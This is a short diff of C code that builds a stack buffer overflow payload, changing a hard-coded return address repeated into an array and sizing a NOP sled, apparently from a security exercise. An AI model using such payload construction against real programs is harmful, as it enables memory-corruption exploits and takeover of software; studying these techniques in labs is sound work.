@@ -19,7 +19,7 @@ int main(void)
   char rt_arr[12] = "";
 //bf ff fe c8
   for (int i=0; i <3 ; i++){
-        strcat(rt_arr, "\xc8\xfe\xff\xbf");
+        strcat(rt_arr, "\xd4\xfe\xff\xbf");
   }
 
   int sizeOfNoOp = 203;
